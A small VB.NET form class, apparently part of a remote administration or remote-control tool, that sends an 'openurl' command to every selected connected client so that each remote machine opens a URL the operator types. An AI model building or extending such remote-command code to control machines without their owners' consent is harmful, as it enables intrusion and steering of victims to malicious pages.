Public Class Form15



    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim TE$ = TextBox1.Text
        Dim TEe$ = "?"
        If TextBox1.Text = "" Then
            AvButton1.Enabled = False
            Label1.Text = "Open URL ( " + TEe + " )"
        Else
            Label1.Text = "Open URL ( " + TE + " )"
            AvButton1.Enabled = True
        End If




    End Sub

    Private Sub Form15_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub AvButton1_Click(sender As Object, e As EventArgs) Handles AvButton1.Click
        If TextBox1.Text = "" Then
        Else



            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "openurl" & "|U|" & TextBox1.Text)
                Form1.colord()
            Next
            Me.Close()
        End If
    End Sub
End Class